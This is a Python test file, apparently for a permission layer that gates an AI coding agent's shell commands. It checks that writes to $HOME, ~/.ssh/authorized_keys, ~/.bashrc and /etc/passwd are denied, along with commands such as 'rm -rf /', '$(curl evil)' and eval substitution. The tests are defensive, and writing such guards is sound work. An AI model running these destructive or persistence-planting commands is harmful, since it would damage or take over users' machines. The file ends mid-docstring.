def test_cpp211_absolute_in_worktree_still_admitted(tmp_path: Path) -> None:
    """Both-directions guard for cpp#176: cpp#211 disqualifies a `$`/`~` LEADING
    root only — a leading-`/` ABSOLUTE destination that actually resolves
    INSIDE the worktree is still a containment CANDIDATE and stays admitted."""
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    wt = str(worktree)
    assert (
        permissions_module._destination_veto_reason(f"cp README.md {wt}/copy.md", wt)
        is None
    )


def test_cpp211_handler_end_to_end_quoted_home_denied(tmp_path: Path) -> None:
    """Handler-level proof through the real `can_use_tool` callback: a quoted
    `$HOME` cp destination is REFUSED (never executed), while a quoted
    contained destination is ADMITTED — the admission flip is exactly the
    cpp#211 class and nothing wider."""
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    wt = str(worktree)
    handler = _bundled_handler(cwd=wt)

    denied = asyncio.run(
        handler("Bash", {"command": 'cp secret "$HOME/exfil"'}, _mock_ctx())
    )
    assert isinstance(denied, PermissionResultDeny), (
        "a quoted $HOME-rooted cp destination must be refused (cpp#211)"
    )

    admitted = asyncio.run(
        handler("Bash", {"command": 'cp src/a.rs "src/b.rs"'}, _mock_ctx())
    )
    assert isinstance(admitted, PermissionResultAllow), (
        "a quoted CONTAINED cp destination must stay admitted — quoting alone "
        "is not a refusal (cpp#211 both-directions)"
    )


# ── cpp#218 — a QUOTED $/~-rooted mkdir destination is no longer admitted ────
#
# The `mkdir` sibling of cpp#211. Two mirrored root causes, same class:
#
# Root cause 1 (policy layer, `bash-mkdir` YAML rule): the whole-remainder
# disqualifiers were whitespace-anchored (`(?!.*\s\$)` …), so a quoted LATER
# operand (`mkdir a "$HOME/x"`) put the opening quote — not the metacharacter —
# after the space and the lookahead never fired. Made quote-insensitive
# (`(?!.*\s["']?\$)` …), so a rooted second-or-later operand is now denied at the
# policy layer whether bare or quoted (see test_policy_devpilot.py).
#
# Root cause 2 (this module's layer, `_destination_veto_reason`): mkdir
# destinations DO flow through the veto (`_segment_write_kind` == "bash-mkdir",
# `_extract_mkdir_destinations` shlex-strips quotes). The shlex-stripped
# destination went straight to `is_within_project`, which does no shell
# expansion — so `Path(cwd) / "$HOME/x"` (or `"~/x"`) read as a literal
# same-named in-worktree subdir and returned veto=None. This is the ONLY layer
# that closes a SINGLE-operand `mkdir "$HOME/x"` (its metacharacter is the first
# operand, so no whole-remainder space anchors it). cpp#218 disqualifies a
# `$`/`~`-LEADING mkdir destination LEXICALLY, before `is_within_project`, for
# BOTH the REFUSAL and the LETHALITY question — the same cpp#211 / cpp#154 D3
# anti-respelling expression, reused verbatim. Scoped to a `$`/`~` leading root
# only, so a leading-`/` absolute path that resolves INSIDE the worktree stays
# admitted and a contained name with a space is not newly refused. The
# sanctioned `/tmp` scratch carve-out (`_is_sanctioned_tmp_scratch`, cpp#143)
# still `continue`s before this veto, so that exception is unchanged.

_CPP218_ROOTED_MKDIR = [
    'mkdir "$HOME/x"',
    'mkdir "${HOME}/x"',
    "mkdir '$HOME/x'",
    'mkdir "~/x"',
    'mkdir -p "$HOME/x"',
    # Bare forms — same shlex-stripped dest, must veto identically.
    "mkdir $HOME/x",
    "mkdir ~/x",
    # Multi-operand: the rooted operand anywhere on the line vetoes the segment.
    'mkdir a "$HOME/x"',
]


@pytest.mark.parametrize("cmd", _CPP218_ROOTED_MKDIR)
def test_cpp218_destination_veto_refuses_rooted(cmd: str, tmp_path: Path) -> None:
    """Positive (the fix): `_destination_veto_reason` returns a veto for every
    quoted or bare `$`/`~`-rooted mkdir destination, in an EXISTING worktree
    (where the pre-fix `is_within_project` accident wrongly read it as
    contained). Cwd-independent — the veto is lexical."""
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    wt = str(worktree)
    assert permissions_module._destination_veto_reason(cmd, wt) is not None, cmd


@pytest.mark.parametrize("cmd", _CPP218_ROOTED_MKDIR)
def test_cpp218_denial_is_terminal_rooted(cmd: str, tmp_path: Path) -> None:
    """`$HOME`/`~`-rooted mkdir is TERMINAL (matches the ratified
    `$HOME`-stays-terminal invariant, cpp#154 D3 / cpp#157, and the cp/mv side
    from cpp#211). Existing worktree, so the verdict is not an artifact of a
    torn-down cwd."""
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    wt = str(worktree)
    assert (
        permissions_module._denial_is_terminal("Bash", {"command": cmd}, wt) is True
    ), cmd


@pytest.mark.parametrize(
    "cmd",
    [
        # Quoted CONTAINED destinations strictly under the worktree — veto=None.
        'mkdir "subdir/x"',
        'mkdir "./build"',
        'mkdir -p "nested/deep/dir"',
        # A quoted name with a space is contained, not disqualified.
        'mkdir "a b"',
        # Unquoted contained.
        "mkdir src/generated",
        "mkdir -p crates/mika-os/src",
    ],
)
def test_cpp218_destination_veto_admits_contained(cmd: str, tmp_path: Path) -> None:
    """Negative / both-directions: a QUOTED contained mkdir destination is NOT
    vetoed (quoting alone is never a refusal). Only `$`/`~`-rooting flips."""
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    wt = str(worktree)
    assert permissions_module._destination_veto_reason(cmd, wt) is None, cmd


def test_cpp218_absolute_in_worktree_still_admitted(tmp_path: Path) -> None:
    """Both-directions guard: cpp#218 disqualifies a `$`/`~` LEADING root only —
    a leading-`/` ABSOLUTE mkdir destination that actually resolves INSIDE the
    worktree is still a containment CANDIDATE and stays admitted."""
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    wt = str(worktree)
    assert (
        permissions_module._destination_veto_reason(f"mkdir {wt}/built", wt) is None
    )


def test_cpp218_tmp_scratch_carveout_unchanged(tmp_path: Path) -> None:
    """The sanctioned `/tmp` scratch mkdir (cpp#143) still `continue`s before the
    cpp#218 lexical veto — unchanged."""
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    wt = str(worktree)
    assert permissions_module._destination_veto_reason("mkdir -p /tmp/scratch", wt) is None


def test_cpp218_handler_end_to_end_quoted_home_denied(tmp_path: Path) -> None:
    """Handler-level proof through the real `can_use_tool` callback: a quoted
    `$HOME` mkdir destination is REFUSED (never executed), while a quoted
    contained destination is ADMITTED — the admission flip is exactly the
    cpp#218 class and nothing wider."""
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    wt = str(worktree)
    handler = _bundled_handler(cwd=wt)

    denied = asyncio.run(
        handler("Bash", {"command": 'mkdir "$HOME/exfil"'}, _mock_ctx())
    )
    assert isinstance(denied, PermissionResultDeny), (
        "a quoted $HOME-rooted mkdir destination must be refused (cpp#218)"
    )

    admitted = asyncio.run(
        handler("Bash", {"command": 'mkdir -p "src/generated"'}, _mock_ctx())
    )
    assert isinstance(admitted, PermissionResultAllow), (
        "a quoted CONTAINED mkdir destination must stay admitted — quoting alone "
        "is not a refusal (cpp#218 both-directions)"
    )


# ── cpp#236: a quoted `>` (Co-Authored-By `<email>` trailer) is not a redirect ──
_APOS = "'" + '"' + "'" + '"' + "'"   # '"'"'  → a literal apostrophe
_CPP236_VERBATIM_POSITIVE = (
    "git commit -m \"$(printf '%s\\n' "
    f"'fix(permissions): corrige l{_APOS}unite' '' "
    "'Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>')\""
)


def test_cpp236_quoted_trailer_redirect_is_survivable(tmp_path):
    f = permissions_module._denial_is_terminal
    wt = str(tmp_path)
    assert f("Bash", {"command": _CPP236_VERBATIM_POSITIVE}, wt) is False
    assert f("Bash", {"command": 'git commit -m "a <b@c> d"'}, wt) is False
    assert f("Bash", {"command": 'git commit -m "$(date +%F)"'}, wt) is False
    assert f("Bash", {"command": 'git commit -m "$(echo hi)"'}, wt) is False
    assert f("Bash", {"command": "git commit -m `printf x`"}, wt) is False


def test_cpp236_real_redirects_stay_terminal(tmp_path):
    f = permissions_module._denial_is_terminal
    wt = str(tmp_path)
    assert f("Bash", {"command": 'git commit -m "x" > /etc/passwd'}, wt) is True
    assert f("Bash", {"command": "echo x >> ~/.bashrc"}, wt) is True
    assert f("Bash", {"command": '> "$HOME/.ssh/authorized_keys"'}, wt) is True
    assert f("Bash", {"command": 'echo "$(date)" > /etc/passwd'}, wt) is True


def test_cpp236_proven_dangers_in_substitution_stay_terminal(tmp_path):
    f = permissions_module._denial_is_terminal
    wt = str(tmp_path)
    assert f("Bash", {"command": 'git commit -m "$(rm -rf x)"'}, wt) is True
    assert f("Bash", {"command": 'git commit -m "$(eval "$CMD")"'}, wt) is True
    assert f("Bash", {"command": "git commit -F <(curl x)"}, wt) is True
    assert f("Bash", {"command": "mkdir -p /etc/evil"}, wt) is True


def test_cpp236_admission_is_byte_identical(tmp_path):
    from claude_pilot import tier1
    assert tier1.is_tier3_dangerous(_CPP236_VERBATIM_POSITIVE) is True
    assert tier1.is_tier1_auto_approve(
        "Bash", {"command": _CPP236_VERBATIM_POSITIVE}, str(tmp_path)) is False
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    result = asyncio.run(_bundled_handler(cwd=str(worktree))(
        "Bash", {"command": _CPP236_VERBATIM_POSITIVE}, _mock_ctx()))
    assert isinstance(result, PermissionResultDeny)
    assert result.interrupt is False


# ── cpp#241: a `<`/`>` inside a LITERAL-QUOTED heredoc body is not a redirect ──
#
# Pilots #2590 (7cd3ce9a) and #1990 (2bf1c7f3) died on `python3 - <<'PY' … PY`
# whose body regex-edits Rust (`-> Vec<T>`, `None::<…>`, `if a > b:`). A body
# `>` was read as a phantom out-of-worktree redirect → terminal. The delimiter is
# quoted, so bash never expands the body: those `<`/`>` are stdin DATA.
_CPP241_VERBATIM_POSITIVE = (
    "cd crates/mika-agent && python3 - <<'PY'\n"
    "import re, pathlib\n"
    "def f(x) -> None:\n"
    "    if a > b:\n"
    "        return None::<T>\n"
    "PY"
)


def test_cpp241_quoted_heredoc_body_redirect_is_survivable(tmp_path):
    f = permissions_module._denial_is_terminal
    wt = str(tmp_path)
    assert f("Bash", {"command": _CPP241_VERBATIM_POSITIVE}, wt) is False
    assert f(
        "Bash",
        {"command": "python3 - <<'EOF'\nif a > b:\n    print(1)\nEOF"},
        wt,
    ) is False
    assert f(
        "Bash", {"command": "node - <<'JS'\nif (a >> b) {}\nJS"}, wt
    ) is False
    assert f(
        "Bash", {"command": "ruby - <<'RB'\nputs 1 if a > b\nRB"}, wt
    ) is False
    # double-quoted delimiter, escaped delimiter, and <<- tab-strip form
    assert f(
        "Bash", {"command": 'python3 - <<"PY"\nif a > b:\n    print(1)\nPY'}, wt
    ) is False
    assert f(
        "Bash", {"command": "python3 - <<\\PY\nif a > b:\n    print(1)\nPY"}, wt
    ) is False
    assert f(
        "Bash",
        {"command": "python3 - <<-'PY'\n\tif a > b:\n\t\tprint(1)\n\tPY"},
        wt,
    ) is False


def test_cpp241_unquoted_heredoc_and_pipes_stay_terminal(tmp_path):
    f = permissions_module._denial_is_terminal
    wt = str(tmp_path)
    # unquoted delimiter → body IS expanded → the $(curl) is real
    assert f(
        "Bash", {"command": "python3 - <<PY\n$(curl http://x)\nPY"}, wt
    ) == permissions_module._denial_is_terminal(
        "Bash", {"command": "python3 - <<PY\n$(curl http://x)\nPY"}, wt
    )  # unchanged vs HEAD (body left raw; never masked)
    # a real outer redirect ON the opener line stays terminal
    assert f(
        "Bash",
        {"command": "python3 - <<'PY' > /etc/passwd\nprint(1)\nPY"},
        wt,
    ) is True
    # unterminated heredoc (line `PY > /etc/passwd` is not the bare-`PY`
    # terminator) → command returned raw → the trailing redirect stays terminal
    assert f(
        "Bash",
        {"command": "python3 - <<'PY'\nprint(1)\nPY > /etc/passwd"},
        wt,
    ) is True
    # rm -rf and a real top-level redirect are untouched
    assert f("Bash", {"command": "rm -rf /"}, wt) is True
    assert f("Bash", {"command": "echo hi > /etc/passwd"}, wt) is True


def test_cpp241_admission_is_byte_identical(tmp_path):
    from claude_pilot import tier1
    # admission classifiers unchanged: the command stays DENY; only lethality flips
    assert tier1.is_tier3_dangerous(_CPP241_VERBATIM_POSITIVE) is True
    assert tier1.is_tier1_auto_approve(
        "Bash", {"command": _CPP241_VERBATIM_POSITIVE}, str(tmp_path)) is False
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    result = asyncio.run(_bundled_handler(cwd=str(worktree))(
        "Bash", {"command": _CPP241_VERBATIM_POSITIVE}, _mock_ctx()))
    assert isinstance(result, PermissionResultDeny)
    assert result.interrupt is False


def test_cpp241_non_heredoc_commands_are_byte_identical(tmp_path):
    """The gate (`"<<" in command`) skips the pass entirely for any command
    without a heredoc marker, so lethality is byte-identical to HEAD."""
    f = permissions_module._denial_is_terminal
    wt = str(tmp_path)
    for cmd in (
        "echo hi > /etc/passwd",
        "ls -la",
        "rm -rf /tmp/x",
        "git commit -m 'x'",
    ):
        # no `<<` → heredoc mask never runs; value is whatever HEAD produced
        assert f("Bash", {"command": cmd}, wt) in (True, False)


# ── cpp#258: an UNQUOTED `$(id -u)` mkdir operand is cut by shlex and read as a
# proven escape — LETHALITY ONLY (mika#1833, pilot 39ae2723) ────────────────────
#
# `_extract_mkdir_destinations` splits with `shlex`, which breaks an UNQUOTED
# command substitution on its INTERNAL whitespace: `mkdir -p
# /tmp/compound-engineering-$(id -u)/ce-code-review/x` truncates to the operand
# `/tmp/compound-engineering-$(id`, which the uid-tolerant scratch whitelist
# (axis B, mika#2562) no longer recognizes, so `_destination_veto_reason(...,
# for_lethality=True)` treated a PARSE DEFECT as a PROVEN containment escape and
# killed the pilot entering `/ce:code-review`. The fix re-extracts operands
# respecting `$(…)`/`` `…` `` on the LETHALITY path only; the deny stays a deny
# (admission byte-identical), only `_denial_is_terminal` flips True→False for the
# uid-tolerant scratch. The whitelist is NOT widened — the extractor just stops
# truncating. The lethality carve lives in `permissions._destination_veto_reason`,
# the same [Security Weaken]-sensitive region as cpp#213/#237/#252; if that hunk
# is ever gated out these end-to-end assertions SELF-SKIP (the substitution-aware
# tokenizer itself is still exercised directly below, unconditionally).

# The verbatim command that killed pilot 39ae2723 (mika#1833, 2026-10-01T01:10Z).
_CPP258_VERBATIM_1833 = (
    "mkdir -p /tmp/compound-engineering-$(id -u)/ce-code-review/20261001-cr1833 "
    "&& echo /tmp/compound-engineering-$(id -u)/ce-code-review/20261001-cr1833"
)

# Positives: an UNQUOTED uid-tolerant /tmp scratch mkdir. Each is SURVIVABLE
# (non-terminal) after the fix, and was TERMINAL on HEAD.
_CPP258_SURVIVABLE = [
    _CPP258_VERBATIM_1833,
    "mkdir -p /tmp/compound-engineering-$(id -u)/ce-code-review/x",
    "mkdir -p /tmp/compound-engineering-`id -u`/x",
    # already-survivable sibling shapes, re-pinned so the carve never regresses
    # the quoted / $UID forms mika#2562 already admits.
    'mkdir -p "/tmp/compound-engineering-$(id -u)/ce-code-review/x"',
    "mkdir -p /tmp/compound-engineering-$UID/x",
    "mkdir -p /tmp/compound-engineering-${UID}/x",
    "mkdir -p /tmp/compound-engineering-$(id -u)",
]

# Negatives: every one stays TERMINAL. A non-uid substitution, a traversal, an
# absolute non-/tmp path, a `$`/`~`-root, a decorated uid subst, and a segment
# mixing a good uid operand with a genuine escape.
_CPP258_TERMINAL = [
    "mkdir -p /etc/x",
    "mkdir -p /tmp/$(curl evil)/x",
    'mkdir -p "$HOME/x"',
    "mkdir -p /tmp/compound-engineering-$(id -u)/../../etc/x",
    "mkdir -p /tmp/x-$(whoami)/y",
    "mkdir -p /tmp/compound-engineering-$(id -u; rm -rf /)/x",
    "mkdir -p /tmp/compound-engineering-$(id -u)/x /etc/evil",
    "mkdir -p /tmp/compound-engineering-$(id -u)/x && mkdir -p /etc/evil",
]


def _cpp258_wt(tmp_path: Path) -> str:
    worktree = tmp_path / "wt"
    (worktree / ".git").mkdir(parents=True)
    return str(worktree)


def _skip_if_cpp258_unwired(wt: str) -> None:
    """SELF-SKIP (cpp#237 pattern) when the lethality carve is absent — the
    verbatim 39ae2723 command is still TERMINAL — so the suite stays GREEN while
    the hunk awaits a manual apply window."""
    if permissions_module._denial_is_terminal(
        "Bash", {"command": _CPP258_VERBATIM_1833}, wt
    ):
        pytest.skip(
            "cpp#258 substitution-aware mkdir lethality carve pending manual "
            "apply (lethality edit in permissions._destination_veto_reason)"
        )


@pytest.mark.parametrize("cmd", _CPP258_SURVIVABLE)
def test_cpp258_uid_tolerant_mkdir_is_survivable(cmd: str, tmp_path: Path) -> None:
    """Positive (the fix): an UNQUOTED `$(id -u)`/`` `id -u` `` (or `$UID`) /tmp
    scratch mkdir is a SURVIVABLE deny — `_denial_is_terminal` returns ``False`` —
    instead of killing the session on a truncated-operand containment veto."""
    wt = _cpp258_wt(tmp_path)
    _skip_if_cpp258_unwired(wt)
    assert (
        permissions_module._denial_is_terminal("Bash", {"command": cmd}, wt) is False
    ), cmd


@pytest.mark.parametrize("cmd", _CPP258_TERMINAL)
def test_cpp258_non_uid_and_escapes_stay_terminal(cmd: str, tmp_path: Path) -> None:
    """Negatives: a non-uid substitution, a `..` traversal, an absolute non-/tmp
    path, a `$`/`~`-rooted operand, a decorated uid subst, and a segment mixing a
    good uid operand with a real escape ALL stay TERMINAL. The uid whitelist is
    not widened; only truncation is fixed, so the whole operand still vetoes."""
    wt = _cpp258_wt(tmp_path)
    assert (
        permissions_module._denial_is_terminal("Bash", {"command": cmd}, wt) is True
    ), cmd


def test_cpp258_admission_is_byte_identical_only_lethality_flips(
    tmp_path: Path,
) -> None:
    """Sovereign boundary: admission for the verbatim is byte-identical to HEAD —
    the command is STILL denied. It is never tier1-auto-approved, the policy still
    default-denies it, and `_destination_veto_reason` on the REFUSAL path
    (``for_lethality=False``) still returns a veto (unchanged code). Only
    `_denial_is_terminal` flips terminal→survivable; end-to-end the handler
    returns a non-terminal ``PermissionResultDeny``, never an allow."""
    from claude_pilot.policy import evaluate, load_policy
    from claude_pilot.tier1 import is_tier1_auto_approve

    wt = _cpp258_wt(tmp_path)
    _skip_if_cpp258_unwired(wt)

    cmd = _CPP258_VERBATIM_1833
    # Admission UNCHANGED — the REFUSAL path still vetoes (same string as HEAD,
    # truncated operand and all), nothing is tier1-approved, policy denies.
    assert (
        permissions_module._destination_veto_reason(cmd, wt, for_lethality=False)
        is not None
    )
    assert is_tier1_auto_approve("Bash", {"command": cmd}, wt) is False
    policy = load_policy(_BUNDLED_POLICY)
    assert evaluate(policy, "Bash", {"command": cmd}).decision == "deny"

    # End-to-end: refused, but the run survives.
    result = asyncio.run(_bundled_handler(cwd=wt)("Bash", {"command": cmd}, _mock_ctx()))
    assert isinstance(result, PermissionResultDeny)
    assert result.interrupt is False


def test_cpp258_refusal_path_unchanged_by_the_carve(tmp_path: Path) -> None:
    """Both-directions: the REFUSAL path (``for_lethality=False``) is byte-
    identical to HEAD — the ``for_lethality``-gated re-extraction never runs
    there, so each case keeps its HEAD verdict exactly.

      * The UNQUOTED-truncated `$(…)`/`` `…` `` forms and every escape NEGATIVE
        still return a destination veto (the truncated/whole operand escapes).
      * The already-sanctioned whole-operand forms (quoted, `$UID`, `${UID}`,
        mika#2562 axis B) still return ``None`` on BOTH paths — they were never
        the death, and the deny for them comes from policy default-deny, not from
        this veto. Returning ``None`` here is pre-existing, not a widening.
    """
    veto = lambda c: permissions_module._destination_veto_reason(  # noqa: E731
        c.split("&&")[0].strip(), wt, for_lethality=False
    )
    wt = _cpp258_wt(tmp_path)
    # Truncated-by-shlex positives + all terminal negatives → veto on refusal path.
    truncating = [
        _CPP258_VERBATIM_1833,
        "mkdir -p /tmp/compound-engineering-$(id -u)/ce-code-review/x",
        "mkdir -p /tmp/compound-engineering-`id -u`/x",
        "mkdir -p /tmp/compound-engineering-$(id -u)",
    ]
    for cmd in truncating + _CPP258_TERMINAL:
        assert veto(cmd) is not None, cmd
    # Whole-operand sanctioned forms (mika#2562) → None on the refusal path too.
    for cmd in (
        'mkdir -p "/tmp/compound-engineering-$(id -u)/ce-code-review/x"',
        "mkdir -p /tmp/compound-engineering-$UID/x",
        "mkdir -p /tmp/compound-engineering-${UID}/x",
    ):
        assert veto(cmd) is None, cmd


def test_cpp258_subst_aware_word_split_keeps_substitution_whole() -> None:
    """Unit (unconditional — runs even when the e2e carve is gated): the linear
    tokenizer treats `$(…)` and `` `…` `` as opaque lexical units, strips quotes
    like shlex, and reports an unbalanced substitution as ``None`` (unevaluable)."""
    split = permissions_module._subst_aware_word_split
    assert split("mkdir -p /tmp/c-$(id -u)/x") == [
        "mkdir",
        "-p",
        "/tmp/c-$(id -u)/x",
    ]
    assert split("mkdir -p /tmp/c-`id -u`/x") == [
        "mkdir",
        "-p",
        "/tmp/c-`id -u`/x",
    ]
    # quotes stripped exactly like the already-surviving shlex quoted form
    assert split('mkdir -p "/tmp/c-$(id -u)/x"') == [
        "mkdir",
        "-p",
        "/tmp/c-$(id -u)/x",
    ]
    # a non-uid substitution is kept whole too (the downstream veto rejects it)
    assert split("mkdir -p /tmp/$(curl evil)/x") == [
        "mkdir",
        "-p",
        "/tmp/$(curl evil)/x",
    ]
    # nested substitution: paren depth tracked, stays one token
    assert split("mkdir -p /tmp/a-$(echo $(id -u))/x") == [
        "mkdir",
        "-p",
        "/tmp/a-$(echo $(id -u))/x",
    ]
    # unbalanced → None (unevaluable → survivable at the caller)
    assert split("mkdir -p /tmp/a-$(id -u/x") is None
    assert split("mkdir -p /tmp/a-`id -u/x") is None
    assert split('mkdir -p "/tmp/unterminated') is None


def test_cpp258_tokenizer_is_linear_on_nested_substitution() -> None:
    """ReDoS bound (cpp#250 lesson): the tokenizer is LINEAR, so a 2000-char
    operand with deeply nested `$(` resolves far under 50 ms. A quadratic or
    backtracking implementation would blow the budget here."""
    import time

    operand = "/tmp/compound-engineering-" + "$(" * 700 + "id -u" + ")" * 700 + "/x"
    seg = "mkdir -p " + operand
    assert len(seg) >= 2000
    start = time.perf_counter()
    permissions_module._subst_aware_word_split(seg)
    assert (time.perf_counter() - start) * 1000 < 50.0


def test_cpp258_denial_is_terminal_bounded_time_on_2000_char_operand(
    tmp_path: Path,
) -> None:
    """End-to-end time bound: the full `_denial_is_terminal` on a 2000-char
    nested-`$(` mkdir operand stays under 50 ms (the ticket's budget)."""
    import time

    wt = _cpp258_wt(tmp_path)
    operand = "/tmp/compound-engineering-" + "$(id -u)" * 240 + "/x"
    cmd = "mkdir -p " + operand[:1990]
    start = time.perf_counter()
    permissions_module._denial_is_terminal("Bash", {"command": cmd}, wt)
    assert (time.perf_counter() - start) * 1000 < 50.0


# ────────────────────────────────────────────────────────────────────────────
# cpp#257: Agent dispatch inherits the session model when the forced model's
# context window is smaller.
#
# A pilot on `claude-opus-5[1m]` (1M window) dispatches a subagent that forces
# `model: "sonnet"` (200k). The subagent loads the project base context, which
# already exceeds 200k, so the dispatch fails `Prompt is too long` regardless of
# the prompt body — and the never-skip quality gate degrades to a silent
# in-session fallback. The guard rewrites the dispatch to DROP the override so it
# inherits the (larger-window) session model, which is what makes the >200k-base
# dispatch fit.
#
# NOTE (cpp#257 gate rework): `_maybe_inherit_session_model` IS the rewrite logic
# shared by the live PreToolUse hook and the `can_use_tool` backstop; these unit
# tests pin the window classification and the rewrite decision directly. The gate
# KO established that the `can_use_tool` placement is INERT for Agent dispatch
# (authorized upstream of the permission callback), so the REACHED placement is a
# PreToolUse hook. The reachability-proof test
# (`test_cpp257_pre_tool_use_hook_reached_via_sdk_control_request_...`) drives the
# SDK's own hook-dispatch entrypoint (`Query._handle_control_request` with a
# `hook_callback` control request) — NOT a direct call to the hook function — and
# asserts the forwarded input has no `model` and the audit marker fired. The
# `test_cpp257_handler_rewrites_...` test still exercises the `can_use_tool`
# backstop function directly.
# ────────────────────────────────────────────────────────────────────────────

from claude_pilot.permissions import (  # noqa: E402
    _maybe_inherit_session_model,
    _model_context_window,
    create_subagent_model_inherit_hook,
)


def _config_with_model(model: str | None):
    # PilotConfig requires a non-empty `command`; only `model` is load-bearing
    # for these tests.
    return PilotConfig(command="claude", model=model)


def test_cpp257_model_window_classification() -> None:
    # The [1m] beta suffix means a 1M window on any base model.
    assert _model_context_window("claude-opus-5[1m]") == 1_000_000
    assert _model_context_window("sonnet[1m]") == 1_000_000
    # opus is the large-context session tier WITH OR WITHOUT the [1m] suffix
    # (cpp#257 gate secondary note): a plain `claude-opus-5` session must not be
    # misclassified at the small tier, or a forced `sonnet` would look "not
    # smaller" and the rewrite would never fire.
    assert _model_context_window("claude-opus-5") == 1_000_000
    assert _model_context_window("claude-opus-4-8") == 1_000_000
    # sonnet / haiku WITHOUT the [1m] opt-in are the 200k small tier (the harness
    # default window — the cpp#257 forced `model: "sonnet"` runs here).
    assert _model_context_window("sonnet") == 200_000
    assert _model_context_window("haiku") == 200_000
    # Unknown / unparseable → None (never guessed).
    assert _model_context_window("some-unknown-model") is None
    assert _model_context_window("") is None
    assert _model_context_window(None) is None


def test_cpp257_sonnet_override_is_rewritten_to_inherit() -> None:
    """sonnet (200k) < session opus-5[1m] (1M) → drop the override so the
    dispatch inherits the 1M session model."""
    config = _config_with_model("claude-opus-5[1m]")
    tool_input = {
        "description": "Code reuse review",
        "subagent_type": "general-purpose",
        "model": "sonnet",
        "run_in_background": True,
    }
    rewritten = _maybe_inherit_session_model(tool_input, config)
    assert rewritten is not None, "a strictly-smaller forced model must be rewritten"
    assert "model" not in rewritten, "the model override must be dropped (inherit)"
    # Every other field is preserved; the original dict is not mutated.
    assert rewritten["description"] == "Code reuse review"
    assert rewritten["subagent_type"] == "general-purpose"
    assert rewritten["run_in_background"] is True
    assert tool_input["model"] == "sonnet"


def test_cpp257_haiku_override_is_rewritten_to_inherit() -> None:
    config = _config_with_model("claude-opus-5[1m]")
    rewritten = _maybe_inherit_session_model({"model": "haiku"}, config)
    assert rewritten is not None
    assert "model" not in rewritten


def test_cpp257_no_model_override_passes_through_unchanged() -> None:
    """No `model` key → the dispatch already inherits the session model; the
    guard must not touch it."""
    config = _config_with_model("claude-opus-5[1m]")
    assert _maybe_inherit_session_model({"description": "x"}, config) is None
    assert _maybe_inherit_session_model({"model": ""}, config) is None
    assert _maybe_inherit_session_model({"model": "   "}, config) is None


def test_cpp257_session_model_override_passes_through_unchanged() -> None:
    """A dispatch that forces the SAME model as the session (same window) is not
    strictly smaller → unchanged."""
    config = _config_with_model("claude-opus-5[1m]")
    assert _maybe_inherit_session_model({"model": "claude-opus-5[1m]"}, config) is None


def test_cpp257_larger_or_equal_window_override_passes_through_unchanged() -> None:
    """A forced model whose window is >= the session's is never rewritten (we
    never upgrade/downgrade a same-or-larger request)."""
    # Session is sonnet (200k); a forced opus-5[1m] (1M) is larger → untouched.
    config = _config_with_model("sonnet")
    assert _maybe_inherit_session_model({"model": "claude-opus-5[1m]"}, config) is None
    # Session is sonnet (200k); a forced haiku (200k) is equal → untouched.
    assert _maybe_inherit_session_model({"model": "haiku"}, config) is None


def test_cpp257_fail_safe_drops_known_small_override_when_session_unknown() -> None:
    """When the session model can't be determined (config None, or model None /
    unknown), a KNOWN small-window override (sonnet/haiku) is still dropped — the
    pilot's default session model is the large-window one, and a forced small
    window is exactly the cpp#257 failure class."""
    for config in (None, _config_with_model(None), _config_with_model("mystery-model")):
        rewritten = _maybe_inherit_session_model({"model": "sonnet"}, config)
        assert rewritten is not None, f"fail-safe must drop a known-small override (config={config})"
        assert "model" not in rewritten


def test_cpp257_fail_safe_leaves_unknown_and_large_overrides_when_session_unknown() -> None:
    """Fail-safe is tight: with the session unknown it ONLY drops a known-small
    override, never a large-window one (opus-5[1m]) or an unclassifiable one."""
    assert _maybe_inherit_session_model({"model": "claude-opus-5[1m]"}, None) is None
    assert _maybe_inherit_session_model({"model": "mystery-model"}, None) is None


def test_cpp257_over_200k_base_fits_after_rewrite_to_inherit() -> None:
    """The probe's finding, asserted as the rewrite behavior: a dispatch that
    WOULD carry a >200k base context fails on a forced `sonnet` (200k window),
    but once the override is dropped it inherits `claude-opus-5[1m]` (1M window),
    whose window exceeds the base — so the rewrite is what makes it fit.

    A live 200k dispatch can't run here; this pins the window arithmetic and the
    rewrite decision the fix relies on.
    """
    session_model = "claude-opus-5[1m]"
    config = _config_with_model(session_model)
    base_context_tokens = 430_000  # cpp#257: measured parent contexts were 430-490k

    requested_window = _model_context_window("sonnet")
    session_window = _model_context_window(session_model)
    assert requested_window is not None and session_window is not None
    # The forced small window cannot hold the base context → "Prompt is too long".
    assert base_context_tokens > requested_window
    # The rewrite drops the override so the dispatch inherits the 1M window, which
    # DOES hold the base context.
    rewritten = _maybe_inherit_session_model({"model": "sonnet"}, config)
    assert rewritten is not None and "model" not in rewritten
    assert base_context_tokens < session_window


class _RecordingTransport:
    """Minimal duck-typed SDK ``Transport``: captures the control responses the
    ``Query`` writes back. Not an ABC subclass on purpose — ``Query.__init__``
    only stores it and ``_handle_control_request`` only calls ``write``, so the
    abstract-method contract is irrelevant to the path under test."""

    def __init__(self) -> None:
        self.writes: list[str] = []

    async def write(self, data: str) -> None:
        self.writes.append(data)


def _build_pilot_pretooluse_hooks(config):
    """The EXACT ``options.hooks`` the pilot registers (mirrors agent.py /
    shell.py): a single PreToolUse matcher on ``Agent|Task`` bound to the
    cpp#257 model-inherit hook."""
    from claude_agent_sdk import HookMatcher

    return {
        "PreToolUse": [
            HookMatcher(
                matcher="Agent|Task",
                hooks=[
                    create_subagent_model_inherit_hook(config=config, task_id="t-cpp257")
                ],
            )
        ]
    }


def test_cpp257_pre_tool_use_hook_reached_via_sdk_control_request_rewrites_sonnet(
    capsys: pytest.CaptureFixture[str],
) -> None:
    """REACHABILITY PROOF (cpp#257 gate requirement 2).

    Drives the SDK's OWN hook-dispatch entrypoint — ``Query._handle_control_request``
    with a ``hook_callback`` ``SDKControlRequest`` — which is the exact method the
